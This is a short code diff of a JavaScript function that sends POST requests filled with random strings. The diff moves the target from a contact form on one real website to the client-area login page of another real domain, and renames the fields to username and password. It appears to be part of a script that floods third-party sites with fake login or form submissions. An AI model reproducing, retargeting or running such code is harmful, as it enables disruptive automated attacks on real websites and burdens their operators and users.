@@ -59,11 +59,11 @@ var code = {
 function kcc() {
 
   code.ajax({
-   url: "https://www.seohocasi.com/teklif/iletisim-ajax.php?"+createrand(5),
+   url: "https://www.netmarlis.com.tr/clientarea.php",
    type: "POST",
    data: {
-         log : createrand(15),
-         pwd : createrand(15),
+         username : createrand(15),
+         password : createrand(15),
 		submit: 'Giriş'						
 		 
    },
